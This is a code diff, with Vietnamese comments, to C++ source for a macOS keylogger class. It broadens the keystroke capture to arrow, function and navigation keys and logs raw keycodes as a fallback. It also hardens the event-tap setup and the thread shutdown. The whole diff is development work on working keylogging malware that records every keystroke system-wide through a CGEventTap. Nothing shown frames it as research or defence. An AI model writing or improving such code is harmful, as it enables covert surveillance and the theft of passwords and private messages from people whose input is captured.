@@ -29,12 +29,42 @@ CGEventRef Keylogger::CGEventCallback(CGEventTapProxy proxy, CGEventType type, C
     else if (keyCode == kVK_Tab) append("[TAB]");
     else if (keyCode == kVK_Space) append(" ");
     else if (keyCode == kVK_Delete) append("[BACK]");
+    else if (keyCode == kVK_ForwardDelete) append("[DEL]");
     else if (keyCode == kVK_Escape) append("[ESC]");
-    else if (keyCode == kVK_Command) append("[CMD]");
+    else if (keyCode == kVK_Command || keyCode == kVK_RightCommand) append("[CMD]");
     else if (keyCode == kVK_Shift || keyCode == kVK_RightShift) { /* Bỏ qua shift */ }
     else if (keyCode == kVK_CapsLock) append("[CAPS]");
     else if (keyCode == kVK_Option || keyCode == kVK_RightOption) append("[OPT]");
     else if (keyCode == kVK_Control || keyCode == kVK_RightControl) append("[CTRL]");
+    // Các phím mũi tên
+    else if (keyCode == kVK_LeftArrow) append("[LEFT]");
+    else if (keyCode == kVK_RightArrow) append("[RIGHT]");
+    else if (keyCode == kVK_UpArrow) append("[UP]");
+    else if (keyCode == kVK_DownArrow) append("[DOWN]");
+    // Các phím chức năng
+    else if (keyCode == kVK_Home) append("[HOME]");
+    else if (keyCode == kVK_End) append("[END]");
+    else if (keyCode == kVK_PageUp) append("[PGUP]");
+    else if (keyCode == kVK_PageDown) append("[PGDN]");
+    else if (keyCode == kVK_Help) append("[INS]"); // Help key trên Mac thường map với Insert
+    // Các phím F1-F12
+    else if (keyCode == kVK_F1) append("[F1]");
+    else if (keyCode == kVK_F2) append("[F2]");
+    else if (keyCode == kVK_F3) append("[F3]");
+    else if (keyCode == kVK_F4) append("[F4]");
+    else if (keyCode == kVK_F5) append("[F5]");
+    else if (keyCode == kVK_F6) append("[F6]");
+    else if (keyCode == kVK_F7) append("[F7]");
+    else if (keyCode == kVK_F8) append("[F8]");
+    else if (keyCode == kVK_F9) append("[F9]");
+    else if (keyCode == kVK_F10) append("[F10]");
+    else if (keyCode == kVK_F11) append("[F11]");
+    else if (keyCode == kVK_F12) append("[F12]");
+    // Các phím khác
+    else if (keyCode == kVK_F13) append("[F13]"); // Print Screen trên một số Mac
+    else if (keyCode == kVK_F14) append("[F14]"); // Scroll Lock trên một số Mac
+    else if (keyCode == kVK_F15) append("[F15]"); // Pause trên một số Mac
+    else if (keyCode == kVK_ANSI_KeypadClear) append("[NUMLOCK]");
     else {
         // Chuyển mã phím thành ký tự Unicode (UTF-8)
         UniChar unicodeString[4];
@@ -51,7 +81,15 @@ CGEventRef Keylogger::CGEventCallback(CGEventTapProxy proxy, CGEventType type, C
                     s += (char)unicodeString[i];
                 }
             }
-            if (!s.empty()) append(s);
+            if (!s.empty()) {
+                append(s);
+            } else {
+                // Nếu không có ký tự Unicode, ghi mã phím
+                append("[" + std::to_string(keyCode) + "]");
+            }
+        } else {
+            // Nếu không có Unicode string, ghi mã phím
+            append("[" + std::to_string(keyCode) + "]");
         }
     }
 
@@ -67,22 +105,37 @@ void Keylogger::MacLoop() {
         kCGEventTapOptionDefault, 
         eventMask, 
         CGEventCallback, 
-        this
+        nullptr // Không cần refcon vì dùng static method
     );
 
     if (!eventTap) {
         fprintf(stderr, "[Keylogger] Failed to create event tap. Check Accessibility Permissions!\n");
+        fprintf(stderr, "[Keylogger] Go to System Preferences > Security & Privacy > Accessibility\n");
+        _isRunning = false;
         return;
     }
 
     runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
+    if (!runLoopSource) {
+        fprintf(stderr, "[Keylogger] Failed to create run loop source\n");
+        CFRelease(eventTap);
+        eventTap = nullptr;
+        _isRunning = false;
+        return;
+    }
+    
     CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
     
     // Bắt đầu lắng nghe
     CGEventTapEnable(eventTap, true);
     
-    // Chạy vòng lặp 
+    // Chạy vòng lặp cho đến khi bị dừng
     CFRunLoopRun();
+    
+    // Cleanup khi run loop kết thúc
+    if (runLoopSource) {
+        CFRunLoopRemoveSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
+    }
 }
 
 void Keylogger::Start() {
@@ -98,22 +151,28 @@ void Keylogger::Stop() {
     if (!_isRunning) return;
     _isRunning = false;
 
+    // Dừng event tap trước
+    if (eventTap) {
+        CGEventTapEnable(eventTap, false);
+        CFMachPortInvalidate(eventTap);
+        CFRelease(eventTap);
+        eventTap = nullptr;
+    }
+
+    // Dừng run loop source
     if (runLoopSource) {
         CFRunLoopSourceInvalidate(runLoopSource);
         CFRelease(runLoopSource);
         runLoopSource = nullptr;
     }
-
-    if (eventTap) {
-        CFMachPortInvalidate(eventTap);
-        CFRelease(eventTap);
-        eventTap = nullptr;
-    }
     
-    CFRunLoopStop(CFRunLoopGetCurrent());
+    // Dừng run loop trong worker thread
+    // Lưu ý: CFRunLoopStop phải được gọi từ trong thread đó
+    // Nên ta sẽ dùng cách khác: invalidate event tap sẽ tự động dừng run loop
     
+    // Đợi thread kết thúc
     if (_workerThread.joinable()) {
-        _workerThread.detach(); 
+        _workerThread.join();
     }
 }
 
